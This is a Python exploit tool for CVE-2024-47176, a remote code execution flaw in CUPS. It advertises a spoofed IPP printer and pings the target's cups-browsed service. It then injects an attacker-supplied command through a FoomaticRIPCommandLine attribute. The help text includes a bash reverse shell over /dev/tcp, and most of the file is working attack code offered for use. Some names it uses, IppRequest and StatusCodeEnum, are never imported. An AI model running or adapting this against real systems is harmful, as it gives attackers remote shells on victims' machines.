from uuid import uuid4
from threading import Thread
from colorama import Fore, Style, init
import argparse
import sys
import os
import socket
import logging
from zeroconf import ServiceInfo, Zeroconf
from ippserver.behaviour import StatelessPrinter
from ippserver.server import IPPServer, IPPRequestHandler
from ippserver.constants import SectionEnum, TagEnum, OperationEnum
from ippserver.parsers import Enum, Boolean, Integer

init(autoreset=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Discovery:
    def __init__(self, printer_name, ip_address, port):
        self.printer_name = printer_name
        self.printer_name_slug = self.slugify_name(printer_name)
        self.ip_address = socket.inet_aton(ip_address)
        self.port = port
        self.zeroconf = None

    @staticmethod
    def slugify_name(name):
        return "".join([c if c.isalnum() else "_" for c in name])

    def create_ipp_printer_service(self):
        service_type = "_ipp._tcp.local."
        service_name = f"{self.printer_name_slug}._ipp._tcp.local."

        txt_records = {
            "txtvers": "1",
            "qtotal": "1",
            "rp": f"printers/{self.printer_name_slug}",
            "ty": self.printer_name,
            "pdl": "application/postscript,application/pdf",
            "adminurl": f"http://{self.ip_address}:{self.port}",
            "UUID": str(uuid4()),
            "printer-type": "0x800683",
        }

        service_info = ServiceInfo(
            service_type,
            service_name,
            addresses=[self.ip_address],
            port=self.port,
            properties=txt_records,
            server=f"{self.printer_name_slug}.local.",
        )

        return service_info

    def register(self):
        self.zeroconf = Zeroconf()
        self.service_info = self.create_ipp_printer_service()
        self.zeroconf.register_service(self.service_info)
        logging.info(f"{Fore.GREEN}Registered printer service: {self.printer_name}{Style.RESET_ALL}")

    def close(self):
        if self.zeroconf is not None:
            self.zeroconf.unregister_service(self.service_info)
            self.zeroconf.close()
            logging.info(f"{Fore.RED}Unregistered printer service: {self.printer_name}{Style.RESET_ALL}")

    def __del__(self):
        self.close()

class HaxPrinter(StatelessPrinter):
    def __init__(self, reverse, spoof):
        self.cups_filter = '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"'
        self.foomatic_rip = f'*FoomaticRIPCommandLine: {reverse};#'
        self.spoof = spoof
        super().__init__()

    def minimal_attributes(self):
        return {
            (SectionEnum.operation, b'attributes-charset', TagEnum.charset): [b'utf-8'],
            (SectionEnum.operation, b'attributes-natural-language', TagEnum.natural_language): [b'en'],
        }

    def printer_list_attributes(self):
        attr = {
            (SectionEnum.printer, b'printer-uri-supported', TagEnum.uri): [self.printer_uri],
            (SectionEnum.printer, b'uri-authentication-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'uri-security-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'printer-info', TagEnum.text_without_language): [b'Printer using ipp-printer.py'],
            (SectionEnum.printer, b'printer-make-and-model', TagEnum.text_without_language): [f'{self.name} 0.00'.encode()],
            (SectionEnum.printer, b'printer-state', TagEnum.enum): [Enum(3).bytes()],  # Idle state
            (SectionEnum.printer, b'printer-state-reasons', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'ipp-versions-supported', TagEnum.keyword): [b'1.1'],
            (SectionEnum.printer, b'operations-supported', TagEnum.enum): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,
                    OperationEnum.validate_job,
                    OperationEnum.cancel_job,
                    OperationEnum.get_job_attributes,
                    OperationEnum.get_printer_attributes,
                )
            ],
            (SectionEnum.printer, b'multiple-document-jobs-supported', TagEnum.boolean): [Boolean(False).bytes()],
            (SectionEnum.printer, b'charset-configured', TagEnum.charset): [b'utf-8'],
            (SectionEnum.printer, b'charset-supported', TagEnum.charset): [b'utf-8'],
            (SectionEnum.printer, b'natural-language-configured', TagEnum.natural_language): [b'en'],
            (SectionEnum.printer, b'generated-natural-language-supported', TagEnum.natural_language): [b'en'],
            (SectionEnum.printer, b'document-format-default', TagEnum.mime_media_type): [b'application/pdf'],
            (SectionEnum.printer, b'document-format-supported', TagEnum.mime_media_type): [b'application/pdf'],
            (SectionEnum.printer, b'printer-is-accepting-jobs', TagEnum.boolean): [Boolean(True).bytes()],
            (SectionEnum.printer, b'queued-job-count', TagEnum.integer): [b'\x00\x00\x00\x00'],
            (SectionEnum.printer, b'pdl-override-supported', TagEnum.keyword): [b'not-attempted'],
            (SectionEnum.printer, b'printer-up-time', TagEnum.integer): [Integer(self.printer_uptime()).bytes()],
            (SectionEnum.printer, b'compression-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'printer-name', TagEnum.name_without_language): [self.name.encode()],
            (SectionEnum.printer, b'media-default', TagEnum.keyword): [b'iso_a4_210x297mm'],
            (SectionEnum.printer, b'media-supported', TagEnum.keyword): [b'iso_a4_210x297mm'],
            (SectionEnum.printer, b'media-type', TagEnum.keyword): [b'stationery'],
            (SectionEnum.printer, b'media-type-supported', TagEnum.keyword): [b'stationery', f': HAX\n{self.foomatic_rip}\n{self.cups_filter}\n*%'.encode()],
        }
        return attr

    def operation_printer_list_response(self, req, _psfile):
        print(f"\n{Fore.GREEN}Target connected, sending payload ...{Style.RESET_ALL}")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes
        )

def parse_args():
    parser = argparse.ArgumentParser(description="A script for executing commands remotely", add_help=False)

    parser.add_argument("-s", "--spoof", default="Epson blah 1234", help="Printer name (default: Epson blah 1234)")
    parser.add_argument("-t", "--target", help="The IP address of the target machine")
    parser.add_argument("-l", "--listener", required=True, help="Specify your callback remote server or localhost IP (ex: 0.0.0.0)")
    parser.add_argument("-p", "--port", type=int, default=631, help="Port to connect on (default: 631)")
    parser.add_argument("-r", "--reverse", required=True, help="Command to execute (e.g., 'bash -i >& /dev/tcp/<TAR_IP>/443 0>&1' or script file like 'backdoor.sh')")

    help_menu = f"""
{Fore.YELLOW}Usage{Style.RESET_ALL}: CVE-2024-47176.py [options]
{Fore.CYAN}
_________  ____ _____________  _________                     
\_   ___ \|    |   \______   \/   _____/______   ____  ____  
/    \  \/|    |   /|     ___/\_____  \\_  __ \_/ ___\/ __ \ 
\     \___|    |  / |    |    /        \|  | \/\  \__\  ___/ 
 \______  /______/  |____|   /_______  /|__|    \___  >___  >
        \/                           \/             \/    \/ 
    Modify: l0n3m4n | Poc: evilsocket | Tool: RickdeJager 
{Style.RESET_ALL}
{Fore.YELLOW}Description{Style.RESET_ALL}: Unauthenticated Remote Code execution on CUPS <=2.0.1

Options:
  -h, --help        Show this help message and exit
  -s, --spoof       Printer spoof name (default: Epson blah 1234)
  -t, --target      The IP address of the target machine
  -l, --listener    Specify your remote or local host listener (ex: 0.0.0.0)
  -p, --port        Port to connect on (default: 631)
  -r, --reverse     Command to execute (ex: 'bash -i >& /dev/tcp/<TAR_IP>/443 0>&1')

{Fore.YELLOW}Example usage{Style.RESET_ALL}: {Fore.CYAN}python3 CVE-2024-47176.py -l 192.168.1.50 -s "Epson EcoTank L121" -p 631 -r rev.sh -t 192.168.1.100 {Style.RESET_ALL}
"""

    if len(sys.argv) == 1 or '-h' in sys.argv or '--help' in sys.argv:
        print(help_menu)
        sys.exit()

    return parser.parse_args()

def handle_reverse_argument(reverse_arg):
    # Check if reverse_arg is a file
    if os.path.isfile(reverse_arg):
        try:
            with open(reverse_arg, 'r') as file:
                content = file.read()
                return content
        except Exception as e:
            print(f"{Fore.RED}Error reading the file:{Style.RESET_ALL} {e}")
            sys.exit(1)
    else:
        # Return reverse_arg as-is (likely a command)
        return reverse_arg

def send_browsed_packet(target_ip, port):
    message = b"Discovery packet"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (target_ip, port))
    logging.info(f"Sent a UDP packet to {target_ip}:{port}")

def start_discovery(args):
    try:
        discovery = Discovery(args.spoof, args.listener, args.port)
        discovery.register()    
        logging.info("Started discovery")
        return discovery
    except Exception as e:
        logging.error(f"Error during discovery: {e}")
        sys.exit(1)

def start_ipp_server(args):
    printer = HaxPrinter(reverse=handle_reverse_argument(args.reverse), spoof=args.spoof)
    server_address = (args.listener, args.port)
    ipp_server = IPPServer(server_address, IPPRequestHandler, printer)
    
    logging.info(f"{Fore.GREEN}Starting the IPP server{Style.RESET_ALL}")
    server_thread = Thread(target=ipp_server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    return ipp_server

def main():
    args = parse_args()

    # Start discovery and IPP server
    discovery = start_discovery(args)
    ipp_server = start_ipp_server(args)

    # Send UDP packet to target if provided
    if args.target:
        send_browsed_packet(args.target, args.port)

    try:
        # Keeping the main thread alive to keep the server running
        while True:
            pass
    except KeyboardInterrupt:
        logging.info("[Important] User interruption: Session terminated.")
    finally:
        discovery.close()
        ipp_server.shutdown()

if __name__ == "__main__":
    main()
